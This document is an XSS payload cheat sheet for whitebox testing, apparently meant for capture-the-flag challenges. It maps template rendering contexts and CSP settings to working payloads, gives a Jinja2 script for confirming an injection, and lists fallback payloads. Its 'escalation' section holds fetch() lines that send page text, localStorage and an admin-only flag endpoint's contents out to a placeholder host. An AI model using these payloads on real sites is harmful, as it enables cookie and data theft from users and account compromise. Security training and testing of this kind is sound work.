# XSS Payload Reference (Whitebox)

## Rendering Context Table

| Template pattern | Context | Base payload |
|---|---|---|
| `{{ q }}` Jinja2 auto-escape ON | HTML escaped | unlikely exploitable |
| `{{ q\|safe }}` | Raw HTML | `<script>alert(1)</script>` |
| `{{ q\|e }}` then passed to innerHTML via JS | DOM | `<img src=x onerror=alert(1)>` |
| `<input value="{{ q }}">` | HTML attribute | `" onmouseover="alert(1)` |
| `<script>var x = "{{ q }}"</script>` | JS string | `";alert(1)//` |
| `href="{{ q }}"` | URL | `javascript:alert(1)` |
| Template literal `` `${q}` `` | JS template | `${alert(1)}` |
| `dangerouslySetInnerHTML={{__html: q}}` | React raw HTML | `<img src=x onerror=alert(1)>` |

## CSP Strategy Table

| CSP | Strategy |
|---|---|
| None | `<script>` payloads work |
| `script-src 'self'` | `<img onerror>`, `<svg onload>`, JSONP endpoints |
| `script-src 'nonce-X'` | grep source for nonce generation — predictable? leak via XSS? |
| `default-src 'none'` | DNS-only OOB, or CSP reporting endpoint abuse |
| `script-src 'unsafe-eval'` | `eval`-based payloads, `setTimeout('alert(1)')` |
| `img-src` allows external but `connect-src` doesn't | use image beacon instead of `fetch` |

## Isolation Test Boilerplate

```python
# /tmp/aurelinth/test_xss_context.py
from jinja2 import Environment
env = Environment(autoescape=True)

# Match the exact template pattern from source
template = env.from_string('{{ q|safe }}')
payload = '<script>alert(1)</script>'
result = template.render(q=payload)
print("Rendered:", result)
# If payload appears unescaped → confirmed exploitable
```

Run it: `python3 /tmp/aurelinth/test_xss_context.py`

## Escalation Payloads (once XSS confirmed)

```js
// Steal cookie
document.cookie

// Steal full page body (flag may be visible to admin)
fetch('http://OOB_URL/?b='+btoa(document.body.innerText.slice(0,500)))

// Steal localStorage
fetch('http://OOB_URL/?l='+btoa(JSON.stringify(localStorage)))

// Fetch flag from internal endpoint accessible to admin's session
fetch('/FLAG_ENDPOINT_FROM_RECON').then(r=>r.text()).then(d=>fetch('http://OOB_URL/?f='+btoa(d)))
```

## Manual Fallback Payloads

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover="alert(1)
javascript:alert(1)
{{constructor.constructor('alert(1)')()}}
${alert(1)}
<details open ontoggle=alert(1)>
```
